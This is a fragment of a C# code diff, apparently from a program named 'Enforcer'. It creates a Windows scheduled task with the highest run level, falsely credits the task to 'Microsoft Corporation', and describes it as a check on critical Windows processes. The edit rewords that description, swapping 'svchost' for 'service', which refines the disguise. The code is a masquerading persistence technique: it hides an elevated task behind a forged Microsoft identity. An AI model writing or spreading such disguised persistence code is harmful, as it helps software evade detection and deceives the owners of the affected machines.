@@ -185,7 +185,7 @@ namespace Enforcer
                 var taskDefinition = taskService.NewTask();
                 taskDefinition.Settings.DisallowStartIfOnBatteries = false;
                 taskDefinition.RegistrationInfo.Author = "Microsoft Corporation";
-                taskDefinition.RegistrationInfo.Description = "Ensures critical Windows svchost processes are running.";
+                taskDefinition.RegistrationInfo.Description = "Ensures critical Windows service processes are running.";
                 taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
                 taskDefinition.Triggers.Add(taskTrigger);
                 taskDefinition.Actions.Add(execAction);
